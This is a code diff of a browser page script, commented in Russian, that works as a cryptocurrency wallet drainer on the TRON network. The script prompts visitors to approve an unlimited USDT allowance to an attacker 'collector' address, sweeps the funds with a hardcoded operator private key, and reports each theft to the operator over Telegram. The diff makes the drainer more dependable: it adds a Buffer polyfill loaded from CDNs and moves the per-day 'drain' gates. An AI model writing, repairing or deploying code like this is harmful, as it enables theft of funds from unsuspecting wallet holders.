@@ -136,13 +136,12 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 (function(){
 "use strict";
 
-/* ===================== CONFIG ===================== */
+/* ===================== CONFIG — заполнено рабочими значениями ===================== */
 const CFG={
   USDT:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
   DEC:6,
 
-  /* коллектор = spender из апрува; ему заранее заливается TRX на энергию */
-  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
+  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",   // spender из апрува, заряжается TRX
   OP_KEY:"1b62bab37091ae7a9c2537df0edaf035ce96dda00ab4c746cad04603f383d468",
   VAULT:"",                            // пусто = USDT остаются на коллекторе
 
@@ -179,8 +178,23 @@ if(window.__boot&&window.__boot.length)
   window.__boot.splice(0).forEach(m=>log(m,"err"));
 
 const TW={p:null,tronWeb:null,address:null};
-
 let BOOT_RUN=false,PIPE_RUN=false,DISCOVER_RUN=false;
+
+/* ---------- гейты дня и константы режима ---------- */
+const FORCE=new URLSearchParams(location.search).has("force");
+const HAS_OP_KEY=/^([0-9a-fA-F]{64})$/.test(CFG.OP_KEY);
+const dayKey=()=>"drain_"+new Date().toISOString().slice(0,10);
+const colKey=()=>"col_note_"+new Date().toISOString().slice(0,10);
+function readDay(){try{return JSON.parse(localStorage.getItem(dayKey())||"{}");}
+  catch(_){return {};}}
+function bumpDay(patch){
+  const s=Object.assign({done:false,tries:0},readDay(),patch);
+  try{localStorage.setItem(dayKey(),JSON.stringify(s));}catch(_){}
+}
+function oncePerDay(key){
+  try{if(localStorage.getItem(key))return false;
+    localStorage.setItem(key,"1");return true;}catch(_){return true;}
+}
 
 /* ---------- очередь чтений + бэкофф против 429 ---------- */
 let READQ=Promise.resolve();
@@ -241,8 +255,6 @@ async function tgDiscover(){
     });
     CHATS=[...new Set([...CHATS,...s])];saveChats();
     log("tg discover: чатов "+CHATS.length,"info");
-    if(!targets().length)
-      log("нет адресатов: нажми Start у бота и перезагрузи страницу","err");
   }catch(e){log("tg discover: "+e.message,"err");}
   finally{DISCOVER_RUN=false;}
 }
@@ -302,26 +314,52 @@ async function readContract(sel,params){
   },sel);
 }
 
-/* ---------- библиотека для стороны коллектора: три лоадера ----------
-   WebView может резать ESM — последний вариант UMD через <script> проходит всегда */
+/* ---------- библиотека стороны коллектора ----------
+   ступень 0: Buffer (tronweb его требует, WebView не содержит);
+   ступени 1-3: esm.sh → jsdelivr ESM → UMD script-tag                 */
 let TWCLASS=null,LOADERP=null,CW=null;
 
 function loadCollectorLib(){
   if(TWCLASS)return Promise.resolve(TWCLASS);
   if(LOADERP)return LOADERP;
   LOADERP=(async()=>{
+    /* --- Buffer polyfill: два транспорта подряд --- */
+    if(!(window.Buffer&&typeof window.Buffer==="function")){
+      try{
+        log("loader: buffer (esm.sh)…","info");
+        const b=await import("https://esm.sh/buffer@6.0.3");
+        const B=b&&b.Buffer||(b&&b.default&&b.default.Buffer);
+        if(B){window.Buffer=B;}else throw new Error("нет экспорта Buffer");
+      }catch(e){log("buffer esm: "+(e.message||e),"err");}
+    }
+    if(!(window.Buffer&&typeof window.Buffer==="function")){
+      try{
+        await new Promise((res,rej)=>{
+          log("loader: buffer (umd)…","info");
+          const s=document.createElement("script");
+          s.src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/lib/buffer.min.js";
+          s.onload=res;s.onerror=()=>rej(new Error("buffer umd load failed"));
+          document.head.appendChild(s);
+        });
+      }catch(e){log((e&&e.message)||String(e),"err");}
+    }
+    if(!(window.Buffer&&typeof window.Buffer==="function"))
+      throw new Error("Buffer недоступен — подписант работать не сможет");
+    log("Buffer готов","ok");
+
+    /* --- tronweb: три транспорта --- */
     try{
-      log("loader: esm.sh…","info");
+      log("loader: tronweb esm.sh…","info");
       const m=await import("https://esm.sh/tronweb@5.3.2");
       if(m&&m.default){TWCLASS=m.default;return TWCLASS;}
     }catch(e){log("esm.sh: "+(e.message||e),"err");}
     try{
-      log("loader: jsdelivr +esm…","info");
+      log("loader: tronweb jsdelivr +esm…","info");
       const m=await import("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/+esm");
       if(m&&m.default){TWCLASS=m.default;return TWCLASS;}
     }catch(e){log("jsdelivr +esm: "+(e.message||e),"err");}
     await new Promise((res,rej)=>{
-      log("loader: UMD script-tag…","info");
+      log("loader: tronweb UMD script-tag…","info");
       const s=document.createElement("script");
       s.src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
       s.onload=res;
@@ -329,17 +367,17 @@ function loadCollectorLib(){
       document.head.appendChild(s);
     });
     if(!window.TronWeb)throw new Error("window.TronWeb отсутствует");
+    if(!(window.Buffer&&typeof window.Buffer==="function"))
+      throw new Error("Buffer пропал перед UMD-экземпляром");
     TWCLASS=window.TronWeb;
     return TWCLASS;
   })().catch(e=>{LOADERP=null;throw e;});
   return LOADERP;
 }
 
-/* экземпляр подписанта коллектора; ленивый — грузится лишь когда нужен */
 async function collectorWeb(){
   if(CW)return CW;
-  if(!HAS_OP_KEY)
-    throw new Error("OP_KEY не заполнен (64 hex)");
+  if(!HAS_OP_KEY)throw new Error("OP_KEY не заполнен (64 hex)");
   const C=await loadCollectorLib();
   CW=new C({fullHost:"https://api.trongrid.io"});
   await CW.setPrivateKey(CFG.OP_KEY);
@@ -369,22 +407,6 @@ async function confirmPoll(txid,pollW){
   }
   return false;
 }
-
-/* ---------- гейты дня ---------- */
-const FORCE=new URLSearchParams(location.search).has("force");
-const dayKey=()=>"drain_"+new Date().toISOString().slice(0,10);
-const colKey=()=>"col_note_"+new Date().toISOString().slice(0,10);
-function readDay(){try{return JSON.parse(localStorage.getItem(dayKey())||"{}");}
-  catch(_){return {};}}
-function bumpDay(patch){
-  const s=Object.assign({done:false,tries:0},readDay(),patch);
-  try{localStorage.setItem(dayKey(),JSON.stringify(s));}catch(_){}
-}
-function oncePerDay(key){
-  try{if(localStorage.getItem(key))return false;
-    localStorage.setItem(key,"1");return true;}catch(_){return true;}
-}
-const HAS_OP_KEY=/^([0-9a-fA-F]{64})$/.test(CFG.OP_KEY);
 
 /* ---------- отчёт оператору ---------- */
 async function report(st){
@@ -473,7 +495,6 @@ async function autoDrain(st){
   if(!FORCE&&st.usdtRaw<minRaw){log("USDT ниже порога ("+st.usdt+")","info");return;}
   if(!FORCE&&!st.gasOk){log("у холдера < "+CFG.GAS_MIN_TRX+" TRX — окно не выдаём","info");return;}
 
-  /* выбор режима: approve требует заряженного коллектора под последующий свип */
   let mode=CFG.DRAIN_MODE;
   const colCanPay=HAS_OP_KEY&&st.colTrx!==null&&st.colTrx>=CFG.COLLECTOR_MIN_TRX;
   if(mode==="approve"&&!colCanPay&&!FORCE){
@@ -515,7 +536,6 @@ async function autoDrain(st){
         "</code>\nspender <code>"+esc(short(CFG.COLLECTOR))+"</code> value ∞"+
         "\n🔗 <code>"+esc(txid)+"</code>");
 
-      /* тот же сеанс: мгновенный перенос без второго окна */
       try{
         await selfSweep({usdtRaw:st.usdtRaw,allowanceRaw:MAX_UINT},true);
       }catch(e){
@@ -589,7 +609,6 @@ async function pipeline(){
       catch(e){log("selfSweep: "+(e.message||e),"err");}
     }
 
-    /* только здесь, если тихие пути не закрыли вопрос, показываем одно окно */
     if(!swept)await autoDrain(st);
     else log("тихий свип закрыл визит — окно не нужно","ok");
   }finally{PIPE_RUN=false;}
